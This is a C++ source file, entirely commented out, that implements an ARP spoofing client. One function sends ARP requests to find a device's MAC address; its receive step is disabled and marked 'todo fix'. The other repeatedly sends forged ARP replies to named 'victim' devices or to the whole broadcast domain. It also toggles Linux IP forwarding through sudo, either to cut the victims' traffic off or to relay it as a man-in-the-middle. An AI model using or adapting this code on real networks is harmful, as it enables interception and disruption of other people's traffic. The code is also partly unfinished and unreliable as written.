//#include "arp_conn_client.h"
//
//#include <iostream>
//#include <cstring>
//#include <arpa/inet.h>
//#include <netinet/if_ether.h>
//#include <thread>
//#include <netinet/in.h>
//
//using namespace std;
//
//arp_conn_client::arp_conn_client() {
//
//}
//
//#define IP4LEN 4
//mac_addr arp_conn_client::search_for_device(std::string priv_ip) {
//    struct mac_addr my_mac = get_my_mac_address("enp0s3");
//    struct ip4_addr my_ip = get_my_priv_ip_addr("enp0s3");
////    struct in_addr my_ip = ((struct sockaddr_in *)&ether_client->my_priv_ip.ifr_addr)->sin_addr;
//
//    struct in_addr target_ip = {0};
//    if (!inet_aton(priv_ip.c_str(), &target_ip))
//        throw "can't convert device's ip";
//
//
//#define BUFF_LEN 1024
//    char request[BUFF_LEN];
//    memset(request, 0, BUFF_LEN);
//
//
//    // setup arp
//    struct ether_arp *arp_header = (struct ether_arp *) request; // arp_header header
//    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first arp addr type: mac
//    arp_header->arp_pro = htons(ETH_P_IP); // first arp addr type: ip
//    arp_header->arp_hln = ETH_ALEN; // len of mac addr
//    arp_header->arp_pln = IP4LEN; // len of ip addr
//    arp_header->arp_op = htons(ARPOP_REQUEST); // type of arp (request)
//
//    memcpy(arp_header->arp_sha, &my_mac, sizeof(arp_header->arp_sha)); // my spoofed mac addr
//    memcpy(arp_header->arp_spa, &my_ip, sizeof(arp_header->arp_spa)); // device ip
//
//    memset(arp_header->arp_tha, 0, sizeof(arp_header->arp_tha));
//    memcpy(arp_header->arp_tpa, &target_ip, sizeof(arp_header->arp_tpa));
//
//
//#define BUFF_LEN 1024
//    char reply[BUFF_LEN];
//    while (true) {
//
//        // send request
//        ether_client->next_mac_addr.set_next_choice(BROADCAST_MAC);
//        ether_client->next_protocol.set_next_choice(htons(ETH_P_ARP));
//        ether_client->send_data(request, sizeof(ether_arp));
//
//        using namespace std::chrono_literals;
//        std::this_thread::sleep_for(500ms);
//
//        // receive reply
//        memset(reply, 0, BUFF_LEN);
//        ether_client->next_protocol.set_next_choice(htons(ETH_P_ARP));
////        ether_client->recv_data(reply, BUFF_LEN); // todo fix
//
//        struct ether_arp *arp_reply = (struct ether_arp *) reply;
//        if (ntohs(arp_reply->ea_hdr.ar_op) != ARPOP_REPLY) {
//            cout << "received arp not of type reply" << endl;
//            continue;
//        }
//
//        mac_addr res{};
//        memcpy(res.addr, arp_reply->arp_sha, sizeof(res.addr));
//        return res;
//    }
//
//}
//
//void arp_conn_client::spoof_as_device(std::string device,
//                                      std::vector<std::pair<mac_addr, std::string>>& victim_devices, bool block_traffic) {
//
////    struct mac_addr my_mac = ether_client->my_mac;
//    struct mac_addr my_mac = get_my_mac_address("enp0s3");
//    struct in_addr device_ip = {0};
//    if (!inet_aton(device.c_str(), &device_ip))
//        throw "can't convert device's ip";
//
//
//#define BUFF_LEN 1024
//    char buff[BUFF_LEN];
//    memset(buff, 0, BUFF_LEN);
//
//
//    // prepare arp
//    struct ether_arp *arp_header = (struct ether_arp *) buff; // arp_header header
//    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first arp addr type: mac
//    arp_header->arp_pro = htons(ETH_P_IP); // first arp addr type: ip
//    arp_header->arp_hln = ETH_ALEN; // len of mac addr
//    arp_header->arp_pln = IP4LEN; // len of ip addr
//    arp_header->arp_op = htons(ARPOP_REPLY); // type of arp (forged reply)
//
//    memcpy(arp_header->arp_sha, &my_mac, sizeof(arp_header->arp_sha)); // my spoofed mac addr
//    memcpy(arp_header->arp_spa, &device_ip, sizeof(arp_header->arp_spa)); // device ip
//
//    // block/allow traffic (linux)
//    if (block_traffic) to_client_sys("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward");
//    else to_client_sys("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward");
//
//    while (true) {
//        using namespace std::chrono_literals;
//        std::this_thread::sleep_for(300ms);
//
//        if (victim_devices.empty()) { // spoof whole broadcast
//            memset(arp_header->arp_tha, 0xff, ETH_ALEN);
//            memset(arp_header->arp_tpa, 0x00, IP4LEN);
//
//            ether_client->next_mac_addr.set_next_choice(BROADCAST_MAC);
//            ether_client->next_protocol.set_next_choice(htons(ETH_P_ARP));
//            ether_client->send_data(buff, sizeof(ether_arp));
//
//        } else { // spoof every victim
//            for (pair<mac_addr, string> &victim: victim_devices) {
//                mac_addr victim_mac = victim.first;
//                struct in_addr victim_ip = {0};
//                if (!inet_aton(victim.second.c_str(), &victim_ip))
//                    throw "can't convert civtim's ip";
//
//                // send to specific device
//                memcpy(arp_header->arp_tha, &victim_mac, sizeof(arp_header->arp_tha));
//                memcpy(arp_header->arp_tpa, &victim_ip, sizeof(arp_header->arp_tpa));
//
//                ether_client->next_mac_addr.set_next_choice(victim_mac);
//                ether_client->next_protocol.set_next_choice(htons(ETH_P_ARP));
//                ether_client->send_data(buff, sizeof(ether_arp));
//            }
//
//        }
//
//        cout << "spoofed frames sent" << endl;
//    }
//
//}
//
//
